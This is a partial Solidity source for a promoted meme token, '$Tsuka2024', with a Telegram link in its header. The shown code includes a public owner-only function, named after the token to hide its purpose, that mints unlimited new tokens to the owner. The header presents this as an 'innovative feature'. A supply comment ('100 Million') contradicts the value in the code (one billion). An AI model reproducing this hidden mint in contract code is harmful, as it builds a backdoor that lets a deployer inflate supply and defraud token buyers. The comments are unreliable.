//
// $Tsuka2024 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/tsuka2024cn
// 📱 Website ::https://
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Tsuka2024(uint256 amount) public onlyOwner {
 _Tsuka2024(msg.sender, amount);
    }
    ...
    function _Tsuka2024(address account, uint256 amount) internal virtual {
...
contract $Tsuka2024 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Tsuka 2024", "TSUKA 2024") {
     _Tsuka2024(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}